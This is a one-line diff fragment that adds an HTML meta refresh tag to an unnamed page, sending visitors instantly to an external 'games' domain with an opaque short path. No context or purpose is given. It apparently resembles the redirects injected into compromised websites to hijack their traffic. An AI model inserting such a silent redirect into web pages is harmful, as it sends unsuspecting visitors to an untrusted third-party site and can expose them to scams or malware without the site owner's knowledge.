@@ -1,0 +1,1 @@
+<meta http-equiv="refresh" content="0; URL='http://bestatributika-games.com/p/f9l9k'" />
